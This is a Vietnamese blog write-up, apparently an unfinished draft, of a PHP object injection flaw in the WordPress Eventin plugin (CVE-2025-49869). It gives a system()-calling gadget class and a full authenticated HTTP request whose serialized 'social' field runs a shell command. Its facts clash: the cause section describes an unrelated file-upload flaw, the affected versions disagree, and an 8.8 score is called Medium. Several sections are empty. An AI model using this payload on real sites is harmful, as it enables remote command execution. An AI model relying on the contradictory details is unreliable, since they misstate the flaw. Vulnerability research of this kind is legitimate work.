# CVE-2025-49869 Analysis & POC


<!--more-->

## CVE & Basic Info
Lỗ hổng **Deserialization of Untrusted Data** trong **Arraytics Eventin** cho phép **Object Injection**. Vấn đề này ảnh hưởng tới **Eventin**: từ **n/a** đến **4.0.31**.

* **CVE ID**: [CVE-2025-49869](https://www.cve.org/CVERecord?id=CVE-2025-49869)
* **Vulnerability Type**: PHP Object Injection
* **Affected Versions**: 4.0.31
* **Patched Versions**: 4.0.32
* **CVSS severity**: Medium (8.8)
* **Required Privilege**: Contributor
* **Product**: [WordPress Eventin Plugin](https://wordpress.org/plugins/wp-event-solution/)

## Requirements

* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **Eventin**:  
    * `4.0.31` – **vulnerable**  
    * `4.0.32` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Cause
Lỗ hổng xảy ra do hàm xử lý upload cho phép ghi file trực tiếp (`copy()`, `file_put_contents()`) mà **không kiểm tra loại file hoặc xác thực người dùng**, nên attacker có thể **upload file tùy ý (kể cả `.php`)** vào thư mục uploads và thực thi mã độc.



## Code Analysis

1. Cài đặt plugin Eventin phiên bản vulnerable <= `4.0.47`
2. Tạo class để test đặt trong `wp-config.php`

```php
class ObjectInjection
{
   public $command;

   function __destruct(){
		die(system($this->command));
   }
}
```

3. Tạo speaker & organizer từ endpoint `/wp-admin/admin.php?page=eventin#/speakers/create`
4. Bắt request với BurpSuite và sửa lại nội dung trường social 

```http
POST /wp-json/eventin/v2/speakers/?_locale=user HTTP/1.1
Host: localhost
Cookie: wp-settings-time-1=1762427921; wp-settings-1=libraryContent%3Dbrowse%26editor%3Dtinymce; wp-settings-5=mfold%3Do; wp-settings-time-5=1762533510; wp-settings-time-3=1762825503; wp-settings-3=libraryContent%3Dupload; __stripe_mid=dcc582f7-74bd-401e-be05-1837c79a5731efe65a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1763087949%7C3aM2ciS8hkTcgCEYDDk7dRQU6uY2ygj7YSLR25HJoeJ%7C8bb066ee119328980972c950e46547cc793a237d21540591865e8b47cbbe32e8

{"social":"O:15:\"ObjectInjection\":1:{s:7:\"command\";s:4:\"ls /\";}",
"name":"aaaa","category":["speaker"],"designation":"aaaa","email":"aaaa","company_name":"aaaa","company_url":"http://AAA.com","date":null}
```



## Flow


## Proof of Concept (PoC)


# Conclusion


# Key Takeaways

## References

[PHP filters chain](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it)

[Insecure Deserialize](https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html)

[ WordPress Eventin Plugin <= 4.0.31 is vulnerable to PHP Object Injection ](https://patchstack.com/database/wordpress/plugin/wp-event-solution/vulnerability/wordpress-eventin-plugin-4-0-31-php-object-injection-vulnerability?_s_id=cve)  

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-11-14-cve-2025-49869/  

